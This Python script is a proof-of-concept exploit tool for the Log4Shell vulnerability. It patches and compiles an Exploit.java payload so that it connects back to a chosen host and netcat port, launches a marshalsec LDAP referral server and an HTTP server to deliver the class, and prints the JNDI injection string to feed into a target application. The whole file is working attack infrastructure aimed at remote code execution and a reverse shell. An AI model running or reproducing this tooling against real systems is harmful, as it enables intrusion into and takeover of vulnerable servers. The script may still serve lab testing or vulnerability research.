#!/usr/bin/env python3

import argparse
import subprocess
import threading
from pathlib import Path
import os
from http.server import HTTPServer, SimpleHTTPRequestHandler

CURRENT_FOLDER = Path(__file__).parent.resolve()

def modify_java_code(host: str, port: int) -> None:
    java_code_path = os.path.join(CURRENT_FOLDER, "Exploit.java")
    with open(java_code_path, 'r') as file:
        java_code = file.read()

    modified_java_code = java_code.replace('localhost', host).replace('9001', str(port))

    with open(java_code_path, 'w') as file:
        file.write(modified_java_code)

def create_payload(ipaddr: str, port: int) -> None:
    try:
        modify_java_code(ipaddr, port)
        subprocess.run([os.path.join(CURRENT_FOLDER, "jdk1.8.0_202/bin/javac"), "Exploit.java"])
    except OSError as exception:
        print('Error occurred while compiling the Exploit')
        raise exception
    else:
        print('Exploit created successfully')

def payload_server(ipaddr: str, webServerport: int, port: int) -> None:
    create_payload(ipaddr, port)

    print('LDAP server is starting up\n')
     # LDAP server starting on new thread
    thread1 = threading.Thread(target=ldap_server_create, args=(ipaddr, webServerport))
    thread1.start()

    # Web server starting
    print(f"Webserver Starting on port {webServerport} http://0.0.0.0:{webServerport}")
    http_payload = HTTPServer(('0.0.0.0', webServerport), SimpleHTTPRequestHandler)
    http_payload.serve_forever()


def ldap_server_create(ipaddr: str, webServerport: int) -> None:
    exploit_server_script = "${jndi:ldap://%s:1389/a}" % (ipaddr)
    print(f"To run the exploit, pass the script in the application: {exploit_server_script}\n")

    exploit_url = "http://{}:{}/#Exploit".format(ipaddr, webServerport)
    subprocess.run([
        os.path.join(CURRENT_FOLDER, "jdk1.8.0_202/bin/java"),
        "-cp",
        os.path.join(CURRENT_FOLDER, "target/marshalsec-0.0.3-SNAPSHOT-all.jar"),
        "marshalsec.jndi.LDAPRefServer",
        exploit_url,
    ])

def java_checker() -> bool:
    code_status = subprocess.call([
        os.path.join(CURRENT_FOLDER, 'jdk1.8.0_202/bin/java'),
        '-version',
    ], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
    return code_status == 0

def main() -> None:
  
    argument_parser = argparse.ArgumentParser(description='log4shell PoC')
    argument_parser.add_argument('--ipaddr',
                        metavar='ipaddr',
                        type=str,
                        default='localhost',
                        help='Enter IP for LDAPRefServer & Shell')
    argument_parser.add_argument('--webServerport',
                        metavar='webServerport',
                        type=int,
                        default='8000',
                        help='listener port for HTTP port')
    argument_parser.add_argument('--port',
                        metavar='port',
                        type=int,
                        default='9001',
                        help='Netcat Port')

    args = argument_parser.parse_args()

    try:
        if not java_checker():
            print('Java was not found inside the directory')
            raise SystemExit(1)
        payload_server(args.ipaddr, args.webServerport, args.port)
    except KeyboardInterrupt:
        print("Received user interrupted, terminating the program")
        raise SystemExit(0)


if __name__ == "__main__":
    main()
